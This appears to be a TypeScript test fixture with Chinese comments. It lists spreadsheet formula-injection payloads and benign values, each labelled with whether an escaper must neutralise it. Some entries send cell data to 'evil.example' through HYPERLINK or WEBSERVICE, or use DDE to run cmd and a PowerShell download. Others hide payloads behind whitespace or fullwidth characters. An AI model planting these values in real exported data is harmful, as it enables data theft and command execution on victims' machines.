/**
 * 攻击样本库:覆盖常见公式注入载荷与绕过手法。
 * 每个样本标注了期望的检测结果,测试直接用它做断言。
 */

export interface Payload {
  id: string;
  /** 攻击者填进昵称/备注等自由文本字段的值 */
  value: string;
  category: "direct" | "evasion" | "benign";
  description: string;
  /** 期望:shouldEscape = 加固时是否必须转义 */
  shouldEscape: boolean;
}

export const PAYLOADS: Payload[] = [
  // ---- 直接公式注入 ----
  {
    id: "exfil-hyperlink",
    value: '=HYPERLINK("https://evil.example/c?d="&B2,"点击查看")',
    category: "direct",
    description: "HYPERLINK 把相邻单元格数据拼进 URL 外传",
    shouldEscape: true,
  },
  {
    id: "dde-cmd",
    value: "=cmd|'/c calc.exe'!A0",
    category: "direct",
    description: "DDE 唤起本机命令",
    shouldEscape: true,
  },
  {
    id: "dde-function",
    value: '=DDE("cmd";"/c powershell iwr evil.example/p";"!A0")',
    category: "direct",
    description: "DDE 函数形式",
    shouldEscape: true,
  },
  {
    id: "webservice",
    value: '=WEBSERVICE("https://evil.example/?d="&A1)',
    category: "direct",
    description: "WEBSERVICE 远程请求外传数据",
    shouldEscape: true,
  },
  {
    id: "plain-formula",
    value: "=1+1",
    category: "direct",
    description: "最朴素的公式",
    shouldEscape: true,
  },
  {
    id: "plus-formula",
    value: "+SUM(1,2)",
    category: "direct",
    description: "+ 开头触发公式",
    shouldEscape: true,
  },
  {
    id: "minus-formula",
    value: "-2+3",
    category: "direct",
    description: "- 开头且不是纯数字 → 公式",
    shouldEscape: true,
  },
  {
    id: "at-formula",
    value: "@SUM(1,2)",
    category: "direct",
    description: "@ 开头(Excel 隐式交集运算符)触发公式",
    shouldEscape: true,
  },

  // ---- 绕过手法 ----
  {
    id: "leading-spaces",
    value: "   =1+1",
    category: "evasion",
    description: "前导空格藏等号",
    shouldEscape: true,
  },
  {
    id: "leading-tab",
    value: "\t=cmd|'/c calc'!A0",
    category: "evasion",
    description: "前导制表符藏 DDE",
    shouldEscape: true,
  },
  {
    id: "leading-newline",
    value: "\n=1+1",
    category: "evasion",
    description: "前导换行藏等号(单元格内换行)",
    shouldEscape: true,
  },
  {
    id: "leading-ideographic-space",
    value: "　=1+1",
    category: "evasion",
    description: "全角空格(U+3000)藏等号",
    shouldEscape: true,
  },
  {
    id: "fullwidth-equals",
    value: "＝1+1",
    category: "evasion",
    description: "全角等号绕过半角过滤",
    shouldEscape: true,
  },
  {
    id: "fullwidth-plus",
    value: "＋SUM(1,2)",
    category: "evasion",
    description: "全角加号",
    shouldEscape: true,
  },
  {
    id: "fullwidth-at",
    value: "＠SUM(1,2)",
    category: "evasion",
    description: "全角 @",
    shouldEscape: true,
  },
  {
    id: "quote-nested",
    value: '"=1+1',
    category: "benign",
    description: "值本身以双引号开头,CSV 里写成 \"\"\"=1+1\" —— 用来验证解析器先正确还原值再检测;解析后的值首字符是引号,Excel 不会执行",
    shouldEscape: false,
  },
  {
    id: "apostrophe-prequoted",
    value: "'=1+1",
    category: "evasion",
    description: "用户自己输入的单引号开头 —— 转义/还原必须幂等,不能把它改花",
    shouldEscape: true, // 需要再补一层 ',保证还原后仍是 '=1+1
  },
  {
    id: "mixed-ws-fullwidth",
    value: " \t ＝WEBSERVICE(\"https://evil.example/\")",
    category: "evasion",
    description: "前导空白 + 全角等号 + 危险函数 组合",
    shouldEscape: true,
  },

  // ---- 正常数据(绝不能误伤)----
  { id: "number-int", value: "12345", category: "benign", description: "整数", shouldEscape: false },
  { id: "number-negative", value: "-123", category: "benign", description: "负数", shouldEscape: false },
  { id: "number-decimal", value: "-0.5", category: "benign", description: "负小数", shouldEscape: false },
  { id: "number-sci", value: "1e6", category: "benign", description: "科学计数", shouldEscape: false },
  { id: "number-thousands", value: "1,234.50", category: "benign", description: "千分位金额", shouldEscape: false },
  { id: "number-percent", value: "50%", category: "benign", description: "百分数", shouldEscape: false },
  {
    id: "phone-intl",
    value: "+8613800138000",
    category: "benign",
    description: "国际电话号 —— 不会执行公式,但 Excel 会吃掉 + 号,按保真风险转义",
    shouldEscape: true, // medium 级,protectLeadingPlusNumber 默认开
  },
  { id: "text-normal", value: "张三", category: "benign", description: "普通昵称", shouldEscape: false },
  { id: "text-equals-inside", value: "价格=100", category: "benign", description: "等号不在开头", shouldEscape: false },
  { id: "text-email", value: "user@example.com", category: "benign", description: "@ 不在开头", shouldEscape: false },
  { id: "text-quoted", value: '他说"你好"', category: "benign", description: "含双引号的普通文本", shouldEscape: false },
  { id: "text-multiline", value: "第一行\n第二行", category: "benign", description: "单元格内换行的普通文本", shouldEscape: false },
  { id: "text-apostrophe", value: "'单引号开头的备注", category: "benign", description: "单引号开头但后续不危险", shouldEscape: false },
];
